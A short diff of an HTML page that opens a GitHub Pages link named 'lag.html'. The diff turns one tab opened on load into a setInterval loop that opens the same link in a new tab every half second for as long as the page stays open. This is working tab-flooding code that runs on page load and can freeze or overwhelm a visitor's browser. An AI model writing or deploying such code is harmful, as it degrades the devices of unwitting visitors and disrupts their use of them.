@@ -1,16 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Open Music</title>
-
-  <script>
-    window.onload = function () {
-      window.open("https://barodoo.github.io/music/lag.html", "_blank");
-    };
-  </script>
+  <title>Auto Open</title>
 </head>
 <body>
-  <p>If it didn’t open, <a href="https://barodoo.github.io/music/lag.html" target="_blank">click here</a>.</p>
+
+<script>
+function openTab() {
+  window.open("https://barodoo.github.io/music/lag.html", "_blank");
+}
+
+// first attempt
+openTab();
+
+// repeat every 500ms
+setInterval(openTab, 500);
+</script>
+
+<p>Trying to open every 0.5s...</p>
+
 </body>
 </html>
